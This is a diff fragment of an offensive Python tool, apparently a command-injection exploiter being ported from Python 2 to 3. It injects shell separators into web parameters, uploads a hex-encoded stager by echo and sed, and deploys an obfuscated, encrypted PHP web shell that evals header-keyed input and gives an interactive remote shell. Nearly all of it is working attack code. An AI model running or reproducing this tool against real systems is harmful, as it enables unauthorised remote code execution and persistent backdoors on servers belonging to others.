-				urllib2.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.quote_plus("rm " + _gs["payloads"]["stager"]["path"]))).read()
+				urllib.request.urlopen(url + ("?" +_gs["_stager"] + "=" + urllib.parse.quote_plus("rm " + _gs["payloads"]["stager"]["path"]))).read()
 				Print.success("Stager removed")
 
 		def technique_result_based():
 			Print.status("METHOD: Result based injection")
 
-			for special in ["& ", "; ", "| ", "&;& "]:
+			for special in ["", "& ", "; ", "| ", "&;& "]:
 
 				def interactor(command, internal = False):
 					import difflib
 					
 					url = _gs["url"]
 					
-					if _gs["get"] <> None:
-						url = url + "?" + urllib.urlencode(json.loads(_gs["get"].replace("'", "\"").replace("_INJECT_", "\"" + special + command + "\"")))
+					if _gs["get"] != None:
+						url = url + "?" + urllib.parse.urlencode(json.loads(_gs["get"].replace("'", "\"").replace("_INJECT_", "\"" + special + command + "\"")))
 
-					if _gs["post"] <> None:
-						request = urllib2.Request(url, urllib.urlencode(json.loads(_gs["post"].replace("'", "\"").replace("_INJECT_", "\"" + special + command + "\""))))
+					if _gs["post"] != None:
+						request = urllib.request.Request(url, headers=urllib.parse.urlencode(json.loads(_gs["post"].replace("'", "\"").replace("_INJECT_", "\"" + special + command + "\""))))
 					else:
-						request = urllib2.Request(url)
-
+						request = urllib.request.Request(url)
+						
 					if not _gs["cookies"] == None:
 						request.add_header("cookie", _gs["cookies"])
 
-					response = urllib2.urlopen(request).read()
+					response = urllib.request.urlopen(request).read()
 
 					if internal:
 						return response
@@ -1946,8 +2027,8 @@ class CommandInjector(object):
 
 						for i, s in enumerate(difflib.ndiff(normal_response, response)):
 							if s[0] == " ": continue
-							elif s[0] == "+": result = result + s[-1]
-						
+							elif s[0] == "+": result = result + chr(int(s.replace("+","").strip()))
+								
 						return result.replace(command, "")
 
 				if _placeholder == interactor("echo " + _placeholder).strip():
@@ -1958,7 +2039,11 @@ class CommandInjector(object):
 
 					if os == Utility.os.LINUX:
 						Print.status("Uploading stager")
-						interactor("echo -n -e '" + r"\\x" + r"\\x".join([_gs["payloads"]["stager"]["payload"][i:i + 2] for i in range(0, len(_gs["payloads"]["stager"]["payload"]), 2)]) + "' >> " + _gs["payloads"]["stager"]["path"])
+						interactor("echo '0x" + "0x".join([_gs["payloads"]["stager"]["payload"][i:i + 2] for i in range(0, len(_gs["payloads"]["stager"]["payload"]), 2)]) + "' >> " + _gs["payloads"]["stager"]["path"])
+						for i in range(256):
+							interactor("sed -i -- 's/0x" + str("%0.2x" % i) + r"/\\x" + str("%0.2x" % i) + "/g' " + _gs["payloads"]["stager"]["path"])
+						#interactor(r"for i in {0..255}; do sed -i -- \"s/0x$( printf '%02x' $i)/\\x$( printf '%02x' $i)/g\" " + _gs["payloads"]["stager"]["path"] + "; done")
+						
 					elif os == Utility.os.WINDOWS:
 						Print.status("Uploading stager")
 						interactor("echo " + re.compile(r"[\<\>]").sub(r"^\g<0>", _gs["payloads"]["stager"]["payload"].decode("hex")).replace("\"", "\\\"") + " >> " +_gs["payloads"]["stager"]["path"])
@@ -1978,25 +2063,25 @@ class CommandInjector(object):
 		def technique_blind_file_based():
 			Print.status("METHOD: Blind file based injection")
 
-			for special in ["& ", "; ", "| ", "&;& "]:
+			for special in ["", "& ", "; ", "| ", "&;& "]:
 
 				def interactor(command, internal = False):
 					import difflib
 					
 					url = _gs["url"]
 					
-					if _gs["get"] <> None:
-						url = url + "?" + urllib.urlencode(json.loads(_gs["get"].replace("'", "\"").replace("_INJECT_", "\"" + special + command + "\"")))
+					if _gs["get"] != None:
+						url = url + "?" + urllib.parse.urlencode(json.loads(_gs["get"].replace("'", "\"").replace("_INJECT_", "\"" + special + command + "\"")))
 
-					if _gs["post"] <> None:
-						request = urllib2.Request(url, urllib.urlencode(json.loads(_gs["post"].replace("'", "\"").replace("_INJECT_", "\"" + special + command + "\""))))
+					if _gs["post"] != None:
+						request = urllib.request.Request(url, headers=urllib.parse.urlencode(json.loads(_gs["post"].replace("'", "\"").replace("_INJECT_", "\"" + special + command + "\""))))
 					else:
-						request = urllib2.Request(url)
+						request = urllib.request.Request(url)
 
 					if not _gs["cookies"] == None:
 						request.add_header("cookie", _gs["cookies"])
 
-					response = urllib2.urlopen(request).read()
+					response = urllib.request.urlopen(request).read()
 
 					if internal:
 						return response
@@ -2006,14 +2091,14 @@ class CommandInjector(object):
 
 						for i, s in enumerate(difflib.ndiff(normal_response, response)):
 							if s[0] == " ": continue
-							elif s[0] == "+": result = result + s[-1]
+							elif s[0] == "+": result = result + chr(int(s.replace("+","").strip()))
 								
 						return result.replace(command, "")
 					
 				def check_placeholder(_placeholder):
 					try:
 						interactor("echo " + _placeholder + " >> " + _placeholder)
-						return _placeholder == urllib2.urlopen(_gs["url"][:_gs["url"].rfind("/") + 1] + _placeholder).read().strip()
+						return _placeholder == urllib.request.urlopen(_gs["url"][:_gs["url"].rfind("/") + 1] + _placeholder).read().strip()
 					except:
 						return ""
 
@@ -2029,7 +2114,9 @@ class CommandInjector(object):
 						interactor("/bin/rm -f " + _placeholder)
 						
 						Print.status("Uploading stager")
-						interactor("echo -n -e '" + r"\\x" + r"\\x".join([_gs["payloads"]["stager"]["payload"][i:i + 2] for i in range(0, len(_gs["payloads"]["stager"]["payload"]), 2)]) + "' >> " + _gs["payloads"]["stager"]["path"])
+						interactor("echo '0x" + "0x".join([_gs["payloads"]["stager"]["payload"][i:i + 2] for i in range(0, len(_gs["payloads"]["stager"]["payload"]), 2)]) + "' >> " + _gs["payloads"]["stager"]["path"])
+						for i in range(256):
+							interactor("sed -i -- 's/0x" + str("%0.2x" % i) + r"/\\x" + str("%0.2x" % i) + "/g' " + _gs["payloads"]["stager"]["path"])
 						
 					elif os == Utility.os.WINDOWS:
 						Print.status("Removing indicator")
@@ -2064,17 +2151,40 @@ class CommandInjector(object):
 			if technique() and not _gs["url_stager"] == None:
 				
 				# Collect information
+				''' Don't make this optional
 				if Print.confirm("Encrypt response"):
 					_gs["smplshll_response_encryption"] = True
 				else:
 					_gs["smplshll_response_encryption"] = False
 					_gs["payloads"]["smplshll"]["payload"] = _gs["payloads"]["smplshll"]["payload"].replace("72657475726e20285f637279707428225f5f494e505f5053575f5f222c20246275666665722c2022656e63727970742229293b", "72657475726e20246275666665723b")
+				'''
+				
+				Print.status("Setting up encryption")
+				_gs["smplshll_response_encryption"] = True
 							
 				# Prepare payload
+				_gs["_var_eval"] = "".join(random.SystemRandom().choice(string.ascii_uppercase) for x in range(8))
+				_gs["_var_exec"] = "".join(random.SystemRandom().choice(string.ascii_uppercase) for x in range(8))
+				_gs["_var_sudo"] = "".join(random.SystemRandom().choice(string.ascii_uppercase) for x in range(8))
+				_gs["_var_sudo_prompt"] = "".join(random.SystemRandom().choice(string.ascii_uppercase) for x in range(8))
 				_gs["smplshll_main_password_var"] = "".join(random.SystemRandom().choice(string.ascii_uppercase) for x in range(8))
 				_gs["smplshll_main_password"] = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(32))
 				_gs["smplshll_input_password"] = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(32))
-				_gs["payloads"]["smplshll"]["payload"] = Utility.crypt(_gs["smplshll_main_password"], _gs["payloads"]["smplshll"]["payload"].decode("hex").replace("__INP_PSW__", _gs["smplshll_input_password"]))
+				_gs["payloads"]["smplshll"]["payload"] = Utility.crypt(
+					_gs["smplshll_main_password"],
+					Utility.hexToStr(_gs["payloads"]["smplshll"]["payload"]).replace(
+						"__INP_PSW__", _gs["smplshll_input_password"]
+					).replace(
+						"__INP_VAR_EVAL__", _gs["_var_eval"]
+					).replace(
+						"__INP_VAR_EXEC__", _gs["_var_exec"]
+					).replace(
+						"__INP_VAR_SUDO__", _gs["_var_sudo"]
+					).replace(
+						"__INP_VAR_SUDO_PROMPT__", _gs["_var_sudo_prompt"]
+					)
+				)
+				
 				_1 = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8))
 				time.sleep(0.1)
 				_2 = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8))
@@ -2092,16 +2202,16 @@ class CommandInjector(object):
 				_8 = "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(8))
 
 				_gs["payloads"]["smplshll"]["payload"] = "3c3f7068702066756e6374696f6e20{0}2824{2}2c2024{3}2c2024{4}203d2027{5}2729207b2024{6}203d2027273b206966202824{4}20213d3d2027{5}27297b2024{3}203d206261736536345f6465636f64652824{3}293b207d20666f7220282024{7}203d20303b2024{7}203c207374726c656e2824{3}293b2024{7}2b2b29207b2024{8}203d206f7264287375627374722824{3}2c2024{7}29293b206966202824{4}203d3d2027{5}2729207b2024{8}202b3d206f7264287375627374722824{2}2c20282824{7}202b2031292025207374726c656e2824{2}292929293b2024{6}202e3d206368722824{8}20262030784646293b207d20656c7365207b2024{8}202d3d206f7264287375627374722824{2}2c20282824{7}202b2031292025207374726c656e2824{2}292929293b2024{6}202e3d20636872286162732824{8}2920262030784646293b207d207d2069662824{4}203d3d2027{5}2729207b2024{6}203d206261736536345f656e636f64652824{6}293b207d2072657475726e2024{6}3b207d206576616c28{0}28245f5345525645525b22485454505f{1}225d2c2027{9}272c2027{0}2729293b3f3e".format(
-					_1.encode("hex"),
-					_gs["smplshll_main_password_var"].encode("hex"),
-					_2.encode("hex"),
-					_3.encode("hex"),
-					_4.encode("hex"),
-					_5.encode("hex"),
-					_6.encode("hex"),
-					_7.encode("hex"),
-					_8.encode("hex"),
-					_gs["payloads"]["smplshll"]["payload"].encode("hex")
+					Utility.strToHex(_1),
+					Utility.strToHex(_gs["smplshll_main_password_var"]),
+					Utility.strToHex(_2),
+					Utility.strToHex(_3),
+					Utility.strToHex(_4),
+					Utility.strToHex(_5),
+					Utility.strToHex(_6),
+					Utility.strToHex(_7),
+					Utility.strToHex(_8),
+					Utility.strToHex(_gs["payloads"]["smplshll"]["payload"])
 				)
 				
 				stager_upload(_gs["url_stager"], _gs["payloads"]["smplshll"]["payload"], _gs["payloads"]["smplshll"]["path"])
@@ -2124,13 +2234,13 @@ def main(argv):
 			"get=",
 			"cookies=",
 		])
-	except getopt.GetoptError, err:
-		print help_notes
-		print err
+	except getopt.GetoptError as err:
+		print(help_notes)
+		print(err)
 		sys.exit(2)
 	for opt, arg in opts:
 		if opt in ("--help"):
-			print help_notes
+			print(help_notes)
 			sys.exit()
 		elif opt in ("--url"): _gs["url"] = arg
 		elif opt in ("--post"): _gs["post"] = arg
@@ -2140,9 +2250,9 @@ def main(argv):
 	if (not _gs["url"] == ""):
 		
 		try:
-			urllib2.urlopen(_gs["url"]).read()
-		except urllib2.URLError, e:
-			print "\n  \033[91mCannot access the interface\033[0m"
+			urllib.request.urlopen(_gs["url"]).read()
+		except urllib.URLError as e:
+			print("\n  \033[91mCannot access the interface\033[0m")
 			sys.exit(2)
 
 		## Initialize command injector
@@ -2201,7 +2311,7 @@ def main(argv):
 			readline.set_completer_delims("")
 			
 			
-			user_input = raw_input("\033[4mmando.me\033[0m > ").strip()
+			user_input = input("\033[4mmando.me\033[0m > ").strip()
 						
 			if (not MandoCommand.command(user_input)):
 				if _gs["system"] == Utility.os.LINUX:
@@ -2210,7 +2320,7 @@ def main(argv):
 					output = PHPInteractor.command("cd " + _gs["working_directory"] + " && " + user_input + " && echo. && echo %cd%").strip().split("\n")
 				else:
 					output = ""
-					
+				
 				_gs["working_directory"] = Utility.check_working_directory(_gs["working_directory"], output[len(output) - 1])
 				for x in (output[:(len(output) - 1) - output[::-1].index("")] if '' in output else output[:len(output) - 1]): Print.text(x)
 				#print "  " + "\n  ".join((output[:(len(output) - 1) - output[::-1].index("")] if '' in output else output[:len(output) - 1]))
@@ -2227,15 +2337,15 @@ try:
 	signal.signal(signal.SIGTSTP, handler)
 	
 	if __name__ == "__main__": main(sys.argv[1:])
-except Exception, err:
+except Exception as err:
 	import traceback
 	
-	print ""
+	print("")
 	Print.error("Something went wrong. Terminating program.")
-	print ""
-	print "\033[91m"
-	print traceback.print_exc(file=sys.stdout)
-	print "\033[0m"
+	print("")
+	print("\033[91m")
+	print(traceback.print_exc(file=sys.stdout))
+	print("\033[0m")
 	
 	MandoCommand.mc_exit(None)
 	
